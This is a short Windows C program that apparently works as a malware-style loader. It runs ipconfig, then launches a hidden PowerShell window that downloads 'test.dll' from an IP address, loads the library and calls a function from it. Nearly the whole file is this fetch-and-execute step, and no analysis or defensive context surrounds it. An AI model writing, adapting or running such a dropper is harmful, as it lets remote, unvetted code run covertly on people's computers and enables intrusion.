#include <windows.h>
typedef int (*importFunction)();

int loadDLL()
{
int status = 0;
system("start powershell -windowstyle Hidden Invoke-WebRequest -Uri 'http://192.168.225.196/test.dll' -OutFile 'test.dll'");
importFunction test;
HINSTANCE testLibrary = LoadLibrary("test.dll");
if (testLibrary)
{
test = (importFunction)GetProcAddress(testLibrary, "test.dll");
if(test)
{
status = test();
}
FreeLibrary(testLibrary);
}
return status;
}

int main(int argc, char **argv)
{
//loadDLL();
system("ipconfig.exe");
loadDLL();
}
